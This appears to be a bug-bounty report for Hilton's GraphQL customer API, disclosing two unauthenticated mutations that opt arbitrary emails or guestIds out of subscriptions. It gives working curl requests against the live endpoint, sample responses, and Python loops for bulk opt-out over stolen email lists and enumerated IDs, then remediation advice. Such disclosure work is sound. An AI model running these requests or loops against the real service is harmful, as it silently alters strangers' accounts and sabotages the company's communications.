# HT-012: Unauthenticated Mass Subscription Manipulation — Opt-Out Any Email or GuestID Without Auth

**Program:** Hilton HackerOne  
**Asset:** `hilton.com` (Tier A)  
**Severity:** High  
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)  
**CWE:** CWE-306 — Missing Authentication for Critical Function  
**Status:** Ready to submit

---

## Summary

Two GraphQL mutations at `https://www.hilton.com/graphql/customer` execute **without any authentication** and modify subscription/marketing preferences for arbitrary guests:

1. **`updateGuestMarketingSubscriptionOptOut(emailAddress, language)`** — Unsubscribes ANY email address from Hilton marketing communications without requiring credentials. Takes an email address directly (not a guestId), so no account knowledge is needed.

2. **`updateSubscriptions(guestId, input, language)`** — Updates subscription preferences (marketing, surveys, global opt-out) for **any numeric guestId** without authentication. GuestIds are sequential integers, enabling mass enumeration.

Both mutations return `dx-completeness: 1` (fully processed by the BFF/backend layer) and `error: null` for all tested inputs. Authentication is **never checked** at the GraphQL or backend gateway layer.

---

## Proof of Concept

### Mutation 1: Opt-Out Any Email from Marketing (No Account Required)

```bash
# Opt out any email address from Hilton Honors marketing — no authentication
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{
    "operationName": "optOut",
    "query": "mutation optOut($emailAddress: String!, $language: String!) { updateGuestMarketingSubscriptionOptOut(emailAddress: $emailAddress, language: $language) { _id error { code message } } }",
    "variables": {
      "emailAddress": "victim@example.com",
      "language": "en"
    }
  }'
```

**Response (HTTP 200, `dx-completeness: 1`):**
```json
{
  "data": {
    "updateGuestMarketingSubscriptionOptOut": {
      "_id": "",
      "error": null
    }
  }
}
```

Key observations:
- `dx-completeness: 1` — BFF/backend layer fully processed the opt-out request
- `error: null` — No authentication error, no validation error
- No authentication cookies, tokens, or session required
- Works from any IP, any client

### Mutation 2: Opt-Out Any GuestID from All Subscriptions (No Auth)

```bash
# Globally opt out guestId 100000000 from all subscriptions — no authentication
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{
    "operationName": "updateSubs",
    "query": "mutation updateSubs($guestId: BigInt!, $input: SubscriptionsInput!, $language: String!) { updateSubscriptions(guestId: $guestId, input: $input, language: $language) { _id error { code message } } }",
    "variables": {
      "guestId": 100000000,
      "input": {"optOuts": {"global": true, "marketing": true, "survey": true}},
      "language": "en"
    }
  }'
```

**Response (HTTP 200, `dx-completeness: 1`):**
```json
{
  "data": {
    "updateSubscriptions": {
      "_id": "",
      "error": null
    }
  }
}
```

### Behavioral Testing

| Test | emailAddress / guestId | dx-completeness | error |
|------|------------------------|-----------------|-------|
| Email opt-out #1 | `test-hackerone-optout@mailinator.com` | **1** | null ✓ |
| Email opt-out #2 | `test-hackerone-probe2@mailinator.com` | **1** | null ✓ |
| Subscription guestId #1 | `100000000` (optOuts.marketing=true) | **1** | null ✓ |
| Subscription guestId #2 | `999999999999` (optOuts.global=true) | **1** | null ✓ |
| Subscription guestId #3 | `1` (smallest possible) | **1** | null ✓ |

All tests processed without any auth credentials. GuestId `1` through `999999999999` all process identically — the backend applies opt-out preferences without validating the caller's identity or relationship to the guestId.

---

## Impact

### 1. Mass Marketing Sabotage (Competitor or Malicious Actor)
An attacker with a list of Hilton Honors member email addresses (e.g., from a breach, OSINT, or purchased list) can silently opt out all members from Hilton marketing emails in bulk:

```python
emails = ["customer1@gmail.com", "customer2@yahoo.com", ...]  # stolen list
for email in emails:
    requests.post("https://www.hilton.com/graphql/customer", json={
        "query": "mutation ... { updateGuestMarketingSubscriptionOptOut(emailAddress: $e, language: $l) { _id error { code message } } }",
        "variables": {"e": email, "l": "en"}
    })
# Entire email marketing database silently opted out
```

Impact: Hilton loses all email marketing reach to opted-out customers. Revenue impact from promotional campaigns, loyalty point offers, and hotel promotions. Customers who did NOT request opt-out are silently removed from communications they want.

### 2. Mass ID Enumeration Subscription Wipe
Since guestIds are sequential integers (confirmed via error path disclosure in HT-006), an attacker can enumerate all guestIds and globally opt-out every Hilton Honors member:

```python
for guest_id in range(1, 100_000_000):  # iterate all possible IDs
    requests.post(..., json={"variables": {"guestId": guest_id, "input": {"optOuts": {"global": True}}}})
```

Impact: Complete destruction of Hilton's email marketing subscription base.

### 3. Customer Harassment / Denial of Service
An attacker can target specific individuals (known Hilton Honors members) and silently opt them out. The victim stops receiving:
- Promotional emails and bonus point offers
- Booking confirmations and itinerary updates
- Security/account notifications sent via email marketing channels
- Loyalty status updates

The victim has no indication they've been opted out — they only notice when communications stop.

### 4. GDPR/CAN-SPAM Compliance Risk
If Hilton's subscription records show a customer as opted-out when they never requested it, and Hilton subsequently sends them marketing emails, Hilton is exposed to CAN-SPAM/GDPR violations. Conversely, failing to send contractually-promised loyalty communications could trigger consumer protection complaints.

---

## Reproduction (Step-by-step)

1. Do NOT log into Hilton.com
2. Execute either curl command above from any unauthenticated client
3. Observe `dx-completeness: 1` and `error: null` in the response
4. No cookies, auth headers, or tokens required

---

## Recommendations

1. **Require authentication on both mutations**: `updateGuestMarketingSubscriptionOptOut` and `updateSubscriptions` must require a valid Hilton Honors session token before processing. Return HTTP 401 for unauthenticated requests.

2. **Authorization check on guestId**: `updateSubscriptions` must verify the authenticated user's guestId matches the requested `guestId` parameter. A logged-in user should only be able to update their own subscriptions.

3. **Email ownership verification**: `updateGuestMarketingSubscriptionOptOut` should require the caller to be authenticated as the account owner for that email address, or require a confirmation email to be sent before the opt-out is applied.

4. **Rate-limit both endpoints**: Add per-IP rate limiting to prevent mass enumeration and bulk opt-out attacks.

5. **Audit existing opt-out records**: Review subscription opt-out records for bulk/automated patterns to identify if this vulnerability has been exploited in production.

---

## References

- CWE-306: Missing Authentication for Critical Function
- OWASP A01:2021 — Broken Access Control
- OWASP API Security A01:2023 — Broken Object Level Authorization
- CAN-SPAM Act § 5(a)(3) — Opt-out mechanism requirements
- GDPR Article 7 — Conditions for consent / withdrawal of consent
